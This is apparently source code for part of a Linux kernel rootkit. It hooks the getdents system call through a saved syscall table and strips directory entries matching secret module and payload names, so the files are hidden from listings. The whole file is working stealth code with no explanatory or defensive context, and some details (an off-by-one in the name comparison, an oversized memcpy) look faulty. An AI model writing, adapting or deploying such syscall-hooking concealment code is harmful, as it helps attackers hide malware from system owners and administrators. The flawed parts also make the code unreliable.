#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
MODULE_LICENSE("GPL");

void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
	int i;
	struct linux_dirent64* dirent;
	char* tempbuf;
	int tempnread;
	i = 0;
	tempbuf = kmalloc(BUF_SIZE, GFP_KERNEL);
	tempnread = 0;


	while (i < *nread) {
		dirent = (struct linux_dirent64*) (buf + i);
		if (!strcmp(dirent->d_name-1, name)) {

		}
		else {
			memcpy(tempbuf + tempnread, dirent, dirent->d_reclen);
			tempnread += dirent->d_reclen;
		}
		i += dirent->d_reclen;
	}
	memcpy(buf, tempbuf, *nread);
	*nread = tempnread;
	kfree(tempbuf);
}


int getdentsShim(int fd, char* buf, int BUF_SIZE) {
	int nread;
	nread = ((SYS_getdents_type)backup_sys_call_table[SYS_getdents])(fd, buf, BUF_SIZE);
	if (nread <= 0) {
		return nread;
	}
	hidename(buf, &nread, secret_ko_name, BUF_SIZE);
	hidename(buf, &nread, secret_payload_name, BUF_SIZE);
	return nread;
}
